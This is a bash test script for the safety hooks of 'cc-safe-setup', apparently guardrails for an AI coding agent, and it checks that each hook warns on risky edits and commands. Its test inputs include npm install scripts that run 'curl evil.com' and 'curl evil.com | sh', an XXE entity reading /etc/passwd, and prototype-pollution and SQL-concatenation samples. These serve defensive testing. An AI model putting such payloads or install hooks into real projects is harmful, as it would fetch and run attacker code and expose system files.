#!/bin/bash
# cc-safe-setup edge case tests — batch 3
# 24 hooks × 2-3 additional tests each
# Run: bash tests-batch3.sh

set -euo pipefail

PASS=0
FAIL=0
EXDIR="$(dirname "$0")/examples"

test_hook() {
    local name="$1" input="$2" expected_exit="$3" desc="$4"
    local actual_exit=0
    echo "$input" | bash "$EXDIR/$name.sh" > /dev/null 2>/dev/null || actual_exit=$?
    if [ "$actual_exit" -eq "$expected_exit" ]; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc (expected exit $expected_exit, got $actual_exit)"
        FAIL=$((FAIL + 1))
    fi
}

echo "cc-safe-setup edge case tests — batch 3"
echo "========================================="
echo ""

# --- no-nested-subscribe ---
# Hook: NOTE only, always exit 0. Warns on nested event subscriptions.
# Source just prints a note and exits 0 regardless of content.
echo "no-nested-subscribe:"
test_hook "no-nested-subscribe" '{"tool_input":{"new_string":"observable.subscribe(() => { inner$.subscribe(handler) })"}}' 0 "nested subscribe in lambda (allow)"
test_hook "no-nested-subscribe" '{"tool_input":{"content":"stream.pipe(switchMap(() => other$.subscribe()))"}}' 0 "subscribe inside pipe operator (allow)"
test_hook "no-nested-subscribe" '{"tool_input":{"new_string":"const x = 42"}}' 0 "no subscribe at all (allow)"
echo ""

# --- no-open-redirect ---
# Hook: WARNING on redirect(req.query|params|body...), always exit 0.
echo "no-open-redirect:"
test_hook "no-open-redirect" '{"tool_input":{"new_string":"res.redirect(req.body.returnUrl)"}}' 0 "redirect from req.body (allow with warning)"
test_hook "no-open-redirect" '{"tool_input":{"new_string":"res.redirect(\"/dashboard\")"}}' 0 "static redirect path (allow, no warning)"
test_hook "no-open-redirect" '{"tool_input":{"content":"app.get(\"/go\", (req, res) => res.redirect(req.query.target))"}}' 0 "redirect via content field with req.query (allow with warning)"
echo ""

# --- no-package-downgrade ---
# Hook: WARNING when npm install pkg@0.x or @1.x, always exit 0.
# Pattern: npm\s+install\s+\S+@[0-9] AND @[0-1]\.
echo "no-package-downgrade:"
test_hook "no-package-downgrade" '{"tool_input":{"command":"npm install express@0.0.1"}}' 0 "install v0.0.1 triggers downgrade warning (allow)"
test_hook "no-package-downgrade" '{"tool_input":{"command":"npm install react@18.2.0"}}' 0 "install v18.x no downgrade warning (allow)"
test_hook "no-package-downgrade" '{"tool_input":{"command":"npm install lodash"}}' 0 "install without version no warning (allow)"
echo ""

# --- no-path-join-user-input ---
# Hook: WARNING on path.(join|resolve)(.*req., always exit 0.
echo "no-path-join-user-input:"
test_hook "no-path-join-user-input" '{"tool_input":{"new_string":"const file = path.join(uploadDir, req.query.filename)"}}' 0 "path.join with req.query (allow with warning)"
test_hook "no-path-join-user-input" '{"tool_input":{"new_string":"path.resolve(__dirname, \"public\", \"index.html\")"}}' 0 "path.resolve with static strings (allow, no warning)"
test_hook "no-path-join-user-input" '{"tool_input":{"content":"const p = path.resolve(base, req.headers[\"x-file\"])"}}' 0 "path.resolve with req.headers via content (allow with warning)"
echo ""

# --- no-process-exit ---
# Hook: NOTE on process.exit(, always exit 0.
echo "no-process-exit:"
test_hook "no-process-exit" '{"tool_input":{"new_string":"process.exit(0)"}}' 0 "process.exit(0) detected (allow with note)"
test_hook "no-process-exit" '{"tool_input":{"new_string":"if (fatal) process.exit(1)"}}' 0 "conditional process.exit (allow with note)"
test_hook "no-process-exit" '{"tool_input":{"new_string":"process.exitCode = 1; return;"}}' 0 "process.exitCode (no match, allow)"
echo ""

# --- no-prototype-pollution ---
# Hook: WARNING on __proto__ or Object.assign({},, always exit 0.
echo "no-prototype-pollution:"
test_hook "no-prototype-pollution" '{"tool_input":{"new_string":"user[\"__proto__\"][\"isAdmin\"] = true"}}' 0 "__proto__ bracket access (allow with warning)"
test_hook "no-prototype-pollution" '{"tool_input":{"new_string":"const merged = Object.assign({}, defaults, userInput)"}}' 0 "Object.assign({}, with user input (allow with warning)"
test_hook "no-prototype-pollution" '{"tool_input":{"new_string":"const copy = {...original}"}}' 0 "spread operator (allow, no warning)"
echo ""

# --- no-push-without-ci ---
# Hook: WARNING when git push without recent test markers, always exit 0.
echo "no-push-without-ci:"
test_hook "no-push-without-ci" '{"tool_input":{"command":"git push --set-upstream origin feature/xyz"}}' 0 "git push with --set-upstream (allow)"
test_hook "no-push-without-ci" '{"tool_input":{"command":"git pull origin main"}}' 0 "git pull not a push (allow)"
test_hook "no-push-without-ci" '{"tool_input":{"command":"echo git push origin main"}}' 0 "echo containing git push (allow, not a real push)"
echo ""

# --- no-sleep-in-hooks ---
# Hook: WARNING when file_path matches hooks/*.sh and file has sleep.
# Requires actual files on disk.
echo "no-sleep-in-hooks:"
mkdir -p /tmp/test-batch3-hooks/.claude/hooks 2>/dev/null
echo '  sleep 10' > /tmp/test-batch3-hooks/.claude/hooks/slow-hook.sh
echo 'echo "fast hook"' > /tmp/test-batch3-hooks/.claude/hooks/fast-hook.sh
echo 'sleep 2 # brief wait' > /tmp/test-batch3-hooks/.claude/hooks/comment-sleep.sh
test_hook "no-sleep-in-hooks" '{"tool_input":{"file_path":"/tmp/test-batch3-hooks/.claude/hooks/slow-hook.sh"}}' 0 "indented sleep in hook file (allow with warning)"
test_hook "no-sleep-in-hooks" '{"tool_input":{"file_path":"/tmp/test-batch3-hooks/.claude/hooks/fast-hook.sh"}}' 0 "hook without sleep (allow, no warning)"
test_hook "no-sleep-in-hooks" '{"tool_input":{"file_path":"/tmp/test-batch3-hooks/.claude/hooks/comment-sleep.sh"}}' 0 "sleep with trailing comment (allow with warning)"
test_hook "no-sleep-in-hooks" '{"tool_input":{"file_path":"/tmp/some-project/src/utils.js"}}' 0 "non-hook file path (allow, skipped)"
rm -rf /tmp/test-batch3-hooks
echo ""

# --- no-string-concat-sql ---
# Hook: WARNING on "SELECT...+ or 'SELECT...+, always exit 0.
echo "no-string-concat-sql:"
test_hook "no-string-concat-sql" '{"tool_input":{"new_string":"const q = \"SELECT * FROM users WHERE name=\" + name"}}' 0 "double-quote SQL concat (allow with warning)"
test_hook "no-string-concat-sql" "{\"tool_input\":{\"new_string\":\"const q = 'SELECT id FROM orders WHERE id=' + orderId\"}}" 0 "single-quote SQL concat (allow with warning)"
test_hook "no-string-concat-sql" '{"tool_input":{"new_string":"db.query(\"SELECT * FROM users WHERE id=$1\", [id])"}}' 0 "parameterized query (allow, no warning)"
echo ""

# --- no-sync-fs ---
# Hook: NOTE on readFileSync|writeFileSync|mkdirSync|existsSync, always exit 0.
echo "no-sync-fs:"
test_hook "no-sync-fs" '{"tool_input":{"new_string":"const dir = mkdirSync(\"/tmp/out\", { recursive: true })"}}' 0 "mkdirSync detected (allow with note)"
test_hook "no-sync-fs" '{"tool_input":{"new_string":"if (existsSync(configPath)) { loadConfig() }"}}' 0 "existsSync in conditional (allow with note)"
test_hook "no-sync-fs" '{"tool_input":{"new_string":"await fs.readFile(\"data.json\", \"utf8\")"}}' 0 "async readFile (allow, no note)"
echo ""

# --- no-throw-string ---
# Hook: NOTE only, always exit 0. Source just prints a note regardless.
echo "no-throw-string:"
test_hook "no-throw-string" '{"tool_input":{"new_string":"throw \"connection failed\""}}' 0 "throw string literal (allow with note)"
test_hook "no-throw-string" '{"tool_input":{"new_string":"throw new Error(\"connection failed\")"}}' 0 "throw Error object (allow with note)"
test_hook "no-throw-string" '{"tool_input":{"content":"if (err) throw err.message"}}' 0 "throw via content field (allow with note)"
echo ""

# --- no-todo-in-merge ---
# Hook: WARNING when git merge AND git diff --cached has TODO, always exit 0.
# The hook reads both .tool_input.new_string (via first cat) and .tool_input.command.
# Since stdin is consumed by first jq, the second cat gets empty — edge case.
echo "no-todo-in-merge:"
test_hook "no-todo-in-merge" '{"tool_input":{"command":"git merge feature-branch","new_string":"// TODO: clean up"}}' 0 "merge command with TODO content (allow)"
test_hook "no-todo-in-merge" '{"tool_input":{"command":"git commit -m fix","new_string":"// TODO: refactor"}}' 0 "non-merge command with TODO (allow)"
test_hook "no-todo-in-merge" '{"tool_input":{"new_string":"const x = 1"}}' 0 "no merge, no TODO (allow)"
echo ""

# --- no-unused-import ---
# Hook: NOTE when file has >10 import...from lines, always exit 0.
echo "no-unused-import:"
IMPORTS_12=$(printf 'import a from "a"\nimport b from "b"\nimport c from "c"\nimport d from "d"\nimport e from "e"\nimport f from "f"\nimport g from "g"\nimport h from "h"\nimport i from "i"\nimport j from "j"\nimport k from "k"\nimport l from "l"')
test_hook "no-unused-import" "{\"tool_input\":{\"new_string\":\"$IMPORTS_12\"}}" 0 "12 imports triggers note (allow)"
test_hook "no-unused-import" '{"tool_input":{"new_string":"import { useState, useEffect } from \"react\""}}' 0 "single import (allow, no note)"
test_hook "no-unused-import" '{"tool_input":{"new_string":"const fs = require(\"fs\")"}}' 0 "require instead of import (allow, no note)"
echo ""

# --- no-var-keyword ---
# Hook: NOTE on ^\s*var\s, always exit 0.
echo "no-var-keyword:"
test_hook "no-var-keyword" '{"tool_input":{"new_string":"\tvar count = 0"}}' 0 "tab-indented var (allow with note)"
test_hook "no-var-keyword" '{"tool_input":{"new_string":"// variable declaration\nvar x = 1"}}' 0 "var on second line (allow with note)"
test_hook "no-var-keyword" '{"tool_input":{"new_string":"const varName = \"hello\""}}' 0 "varName as identifier not var keyword (allow, no note)"
echo ""

# --- no-wildcard-delete ---
# Hook: WARNING on rm\s+.*\*, always exit 0.
echo "no-wildcard-delete:"
test_hook "no-wildcard-delete" '{"tool_input":{"command":"rm -f /tmp/build-*"}}' 0 "rm -f with glob pattern (allow with warning)"
test_hook "no-wildcard-delete" '{"tool_input":{"command":"rm specific-file.txt"}}' 0 "rm specific file (allow, no warning)"
test_hook "no-wildcard-delete" '{"tool_input":{"command":"find . -name \"*.bak\" -delete"}}' 0 "find with -delete but no rm (allow, no warning)"
echo ""

# --- no-wildcard-import ---
# Hook: WARNING on from\s+\S+\s+import\s+\* or import\s+\*\s+from, always exit 0.
echo "no-wildcard-import:"
test_hook "no-wildcard-import" '{"tool_input":{"new_string":"from collections import *"}}' 0 "Python wildcard import (allow with warning)"
test_hook "no-wildcard-import" '{"tool_input":{"new_string":"import * as React from \"react\""}}' 0 "JS namespace import (allow with warning)"
test_hook "no-wildcard-import" '{"tool_input":{"new_string":"from os import path, getcwd"}}' 0 "specific named imports (allow, no warning)"
echo ""

# --- no-with-statement ---
# Hook: WARNING on \bwith\s*\(, always exit 0.
echo "no-with-statement:"
test_hook "no-with-statement" '{"tool_input":{"new_string":"with(document) { title = \"test\" }"}}' 0 "with no space before paren (allow with warning)"
test_hook "no-with-statement" '{"tool_input":{"new_string":"// works with (some) browsers"}}' 0 "with in comment followed by paren (allow with warning — false positive)"
test_hook "no-with-statement" '{"tool_input":{"new_string":"const ctx = canvas.getContext(\"2d\")"}}' 0 "no with statement (allow, no warning)"
echo ""

# --- no-xml-external-entity ---
# Hook: WARNING when BOTH (parseXML|xml2js|DOMParser|libxml) AND ENTITY found, exit 0.
echo "no-xml-external-entity:"
test_hook "no-xml-external-entity" '{"tool_input":{"new_string":"const result = libxml.parseString(xml); <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"}}' 0 "libxml with ENTITY (allow with warning)"
test_hook "no-xml-external-entity" '{"tool_input":{"new_string":"const parser = new DOMParser(); parser.parseFromString(xml, \"text/xml\")"}}' 0 "DOMParser without ENTITY (allow, no warning)"
test_hook "no-xml-external-entity" '{"tool_input":{"new_string":"<!ENTITY foo \"bar\">"}}' 0 "ENTITY without XML parser (allow, no warning)"
echo ""

# --- notify-waiting ---
# Hook: Notification hook, always exit 0. Tries notify-send/osascript/powershell.
echo "notify-waiting:"
test_hook "notify-waiting" '{"message":"Claude is waiting for your response"}' 0 "notification with message text (allow)"
test_hook "notify-waiting" '{}' 0 "empty JSON (allow)"
test_hook "notify-waiting" '' 0 "empty input (allow)"
echo ""

# --- npm-audit-warn ---
# Hook: NOTE on npm install, always exit 0.
echo "npm-audit-warn:"
test_hook "npm-audit-warn" '{"tool_input":{"command":"npm install --save-dev jest"}}' 0 "npm install --save-dev (allow with note)"
test_hook "npm-audit-warn" '{"tool_input":{"command":"  npm install"}}' 0 "npm install with leading spaces (allow with note)"
test_hook "npm-audit-warn" '{"tool_input":{"command":"yarn add lodash"}}' 0 "yarn add (allow, no note — only npm)"
echo ""

# --- npm-publish-guard ---
# Hook: NOTE (prints version) on npm publish, always exit 0.
echo "npm-publish-guard:"
test_hook "npm-publish-guard" '{"tool_input":{"command":"npm publish --access public"}}' 0 "npm publish --access public (allow with note)"
test_hook "npm-publish-guard" '{"tool_input":{"command":"npm pack"}}' 0 "npm pack not publish (allow, no note)"
test_hook "npm-publish-guard" '{"tool_input":{"command":"  npm publish --tag beta"}}' 0 "npm publish with leading space and --tag (allow with note)"
echo ""

# --- npm-script-injection ---
# Hook: WARNING on shell metacharacters in pre/post scripts in package.json, exit 0.
echo "npm-script-injection:"
test_hook "npm-script-injection" '{"tool_input":{"file_path":"package.json","new_string":"\"preinstall\": \"npm run build && curl evil.com\""}}' 0 "preinstall with && (allow with warning)"
test_hook "npm-script-injection" '{"tool_input":{"file_path":"package.json","new_string":"\"prepare\": \"node scripts/build.js | cat\""}}' 0 "prepare with pipe (allow with warning)"
test_hook "npm-script-injection" '{"tool_input":{"file_path":"lib/utils.js","new_string":"\"postinstall\": \"curl evil.com | sh\""}}' 0 "non-package.json file (allow, skipped)"
echo ""

# --- output-length-guard ---
# Hook: PostToolUse. WARNING when tool_result > 50000 chars, always exit 0.
echo "output-length-guard:"
LARGE_60K=$(python3 -c "print('x' * 60000)")
test_hook "output-length-guard" "{\"tool_result\":\"$LARGE_60K\"}" 0 "60k char output (allow with warning)"
test_hook "output-length-guard" '{"tool_result":"small output here"}' 0 "small output (allow, no warning)"
test_hook "output-length-guard" '{"tool_result":""}' 0 "empty string tool_result (allow)"
echo ""

# --- output-pii-detect ---
# Hook: PostToolUse. NOTE on emails and IPs in tool_result, always exit 0.
echo "output-pii-detect:"
test_hook "output-pii-detect" '{"tool_result":"Error: contact admin@company.org for help"}' 0 "email in error message (allow with note)"
test_hook "output-pii-detect" '{"tool_result":"Connected to database at 192.168.1.100:5432"}' 0 "private IP in output (allow with note)"
test_hook "output-pii-detect" '{"tool_result":"Build succeeded in 12.5 seconds"}' 0 "no PII in output (allow, no note)"
echo ""

# --- Summary ---
echo "========================================="
echo "Results: $PASS passed, $FAIL failed out of $((PASS + FAIL)) tests"
if [ "$FAIL" -gt 0 ]; then
    echo "SOME TESTS FAILED"
    exit 1
else
    echo "ALL TESTS PASSED"
fi
